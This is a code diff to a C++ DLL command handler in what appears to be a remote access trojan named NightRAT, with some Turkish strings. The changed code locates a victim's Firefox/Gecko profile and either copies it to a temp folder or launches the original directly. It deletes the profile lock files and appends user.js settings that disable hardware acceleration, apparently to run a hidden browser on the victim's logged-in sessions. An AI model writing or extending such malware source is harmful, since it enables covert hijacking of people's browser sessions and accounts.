@@ -2245,23 +2245,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring profileDir = L"Default";
 
                     if (isGecko) {
-                        // For Firefox and Gecko based browsers, we ALWAYS load/copy profiles
                         wstring sourceUserData = get_gecko_profile_path(wRequestedPath);
                         if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
                             send_error("Gecko User Data directory not found.");
                             return;
                         }
-
-                        wchar_t tempPath[MAX_PATH];
-                        GetTempPathW(MAX_PATH, tempPath);
-                        wstring tempProfileRoot = tempPath;
-                        tempProfileRoot += L"NightRAT_";
-                        tempProfileRoot += exeName;
-                        tempProfileRoot += L"_Profile";
-
-                        try {
-                            if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
-                        } catch (...) {}
 
                         // Resolve active profile directory using ini or fallback
                         wstring activeProfileSrc = resolve_gecko_profile_from_ini(sourceUserData);
@@ -2274,13 +2262,29 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             return;
                         }
 
-                        // Copy only the resolved active profile's files directly into tempProfileRoot
-                        if (!copy_profile_parallel(activeProfileSrc, tempProfileRoot, "Profiller kopyalanıyor")) {
-                            send_error("Failed to copy Gecko profile.");
-                            return;
-                        }
+                        if (copyProfile) {
+                            wchar_t tempPath[MAX_PATH];
+                            GetTempPathW(MAX_PATH, tempPath);
+                            wstring tempProfileRoot = tempPath;
+                            tempProfileRoot += L"NightRAT_";
+                            tempProfileRoot += exeName;
+                            tempProfileRoot += L"_Profile";
 
-                        profilePath = tempProfileRoot;
+                            try {
+                                if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
+                            } catch (...) {}
+
+                            // Copy only the resolved active profile's files directly into tempProfileRoot
+                            if (!copy_profile_parallel(activeProfileSrc, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                send_error("Failed to copy Gecko profile.");
+                                return;
+                            }
+
+                            profilePath = tempProfileRoot;
+                        } else {
+                            // If copyProfile is false, we launch with the resolved original profile directly
+                            profilePath = activeProfileSrc;
+                        }
 
                     } else if (copyProfile) {
                         wstring sourceUserData = get_browser_profile_path(wRequestedPath);
@@ -2417,15 +2421,17 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         try {
                             if (isGecko) {
                                 fs::create_directories(profilePath);
-                                fs::path userJsPath = fs::path(profilePath) / L"user.js";
-                                FILE* f = _wfopen(userJsPath.wstring().c_str(), L"a");
-                                if (f) {
-                                    fputs("user_pref(\"gfx.webrender.all\", false);\n", f);
-                                    fputs("user_pref(\"gfx.webrender.software\", true);\n", f);
-                                    fputs("user_pref(\"layers.acceleration.disabled\", true);\n", f);
-                                    fputs("user_pref(\"layers.acceleration.force-enabled\", false);\n", f);
-                                    fputs("user_pref(\"media.hardware-video-decoding.enabled\", false);\n", f);
-                                    fclose(f);
+                                if (copyProfile) {
+                                    fs::path userJsPath = fs::path(profilePath) / L"user.js";
+                                    FILE* f = _wfopen(userJsPath.wstring().c_str(), L"a");
+                                    if (f) {
+                                        fputs("user_pref(\"gfx.webrender.all\", false);\n", f);
+                                        fputs("user_pref(\"gfx.webrender.software\", true);\n", f);
+                                        fputs("user_pref(\"layers.acceleration.disabled\", true);\n", f);
+                                        fputs("user_pref(\"layers.acceleration.force-enabled\", false);\n", f);
+                                        fputs("user_pref(\"media.hardware-video-decoding.enabled\", false);\n", f);
+                                        fclose(f);
+                                    }
                                 }
                                 fs::remove(fs::path(profilePath) / L"parent.lock");
                                 fs::remove(fs::path(profilePath) / L"lock");
